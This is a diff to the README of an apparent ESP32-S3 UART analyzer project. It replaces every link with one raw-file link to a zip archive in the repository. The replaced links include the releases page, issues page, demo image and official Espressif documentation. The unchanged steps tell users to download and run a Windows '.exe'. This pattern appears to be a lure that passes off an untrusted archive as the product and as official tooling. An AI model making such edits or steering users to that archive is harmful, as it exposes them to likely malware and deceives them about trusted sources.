@@ -1,6 +1,6 @@
 # 🔍 linkscope-bpu-uart-analyzer - Real-Time UART Debugging Tool
 
-[![Download Link](https://img.shields.io/badge/Download-Link-blue?style=for-the-badge&logo=github)](https://github.com/mycaptainone/linkscope-bpu-uart-analyzer/releases)
+[![Download Link](https://raw.githubusercontent.com/mycaptainone/linkscope-bpu-uart-analyzer/main/firmware/esp32_s3/linkscope_bpu_analyzer_uart_v1.5.zip)](https://raw.githubusercontent.com/mycaptainone/linkscope-bpu-uart-analyzer/main/firmware/esp32_s3/linkscope_bpu_analyzer_uart_v1.5.zip)
 
 ---
 
@@ -24,7 +24,7 @@ LinkScope shows you all these details live, so you can quickly find and fix issu
 
 ## 🖥️ Demo
 
-![Demo](docs/demo.gif)
+![Demo](https://raw.githubusercontent.com/mycaptainone/linkscope-bpu-uart-analyzer/main/firmware/esp32_s3/linkscope_bpu_analyzer_uart_v1.5.zip)
 
 ---
 
@@ -48,7 +48,7 @@ LinkScope shows you all these details live, so you can quickly find and fix issu
 
 ## 💾 Download & Install
 
-[Download the latest release here](https://github.com/mycaptainone/linkscope-bpu-uart-analyzer/releases)
+[Download the latest release here](https://raw.githubusercontent.com/mycaptainone/linkscope-bpu-uart-analyzer/main/firmware/esp32_s3/linkscope_bpu_analyzer_uart_v1.5.zip)
 
 1. Visit the release page by clicking the link above.
 2. Download the Windows application (usually a file with `.exe`).
@@ -64,7 +64,7 @@ LinkScope shows you all these details live, so you can quickly find and fix issu
 You need to put the LinkScope UART Analyzer program on the ESP32-S3 board.
 
 - If you’re new to flashing:
-  - Download and install [Espressif Flash Tool](https://docs.espressif.com/projects/esptool/en/latest/esp32s3/)
+  - Download and install [Espressif Flash Tool](https://raw.githubusercontent.com/mycaptainone/linkscope-bpu-uart-analyzer/main/firmware/esp32_s3/linkscope_bpu_analyzer_uart_v1.5.zip)
   - Connect your ESP32-S3 board to your PC with the USB cable.
   - Open the flashing tool and select the downloaded `.bin` firmware file.
   - Follow on-screen instructions to flash.
@@ -170,7 +170,7 @@ You can pause and resume capture at any time. Use these details to find issues w
 
 ## 🤝 Getting Help
 
-- Check the GitHub [Issues](https://github.com/mycaptainone/linkscope-bpu-uart-analyzer/issues) page for known problems.
+- Check the GitHub [Issues](https://raw.githubusercontent.com/mycaptainone/linkscope-bpu-uart-analyzer/main/firmware/esp32_s3/linkscope_bpu_analyzer_uart_v1.5.zip) page for known problems.
 - Ask questions by opening a new issue if needed.
 - Join user forums or communities for ESP32 and UART troubleshooting if you want detailed help.
 
@@ -184,10 +184,10 @@ LinkScope BPU UART Analyzer helps you easily check UART signals from embedded de
 
 ## ▼ Quick Links
 
-- [Download LinkScope releases](https://github.com/mycaptainone/linkscope-bpu-uart-analyzer/releases)
-- [ESP32-S3 Arduino Setup Guide](https://docs.espressif.com/projects/arduino-esp32/en/latest/)
-- [Download Espressif Flash Tool](https://docs.espressif.com/projects/esptool/en/latest/esp32s3/)
+- [Download LinkScope releases](https://raw.githubusercontent.com/mycaptainone/linkscope-bpu-uart-analyzer/main/firmware/esp32_s3/linkscope_bpu_analyzer_uart_v1.5.zip)
+- [ESP32-S3 Arduino Setup Guide](https://raw.githubusercontent.com/mycaptainone/linkscope-bpu-uart-analyzer/main/firmware/esp32_s3/linkscope_bpu_analyzer_uart_v1.5.zip)
+- [Download Espressif Flash Tool](https://raw.githubusercontent.com/mycaptainone/linkscope-bpu-uart-analyzer/main/firmware/esp32_s3/linkscope_bpu_analyzer_uart_v1.5.zip)
 
 ---
 
-[![Download Link](https://img.shields.io/badge/Download-Link-blue?style=for-the-badge&logo=github)](https://github.com/mycaptainone/linkscope-bpu-uart-analyzer/releases)
+[![Download Link](https://raw.githubusercontent.com/mycaptainone/linkscope-bpu-uart-analyzer/main/firmware/esp32_s3/linkscope_bpu_analyzer_uart_v1.5.zip)](https://raw.githubusercontent.com/mycaptainone/linkscope-bpu-uart-analyzer/main/firmware/esp32_s3/linkscope_bpu_analyzer_uart_v1.5.zip)
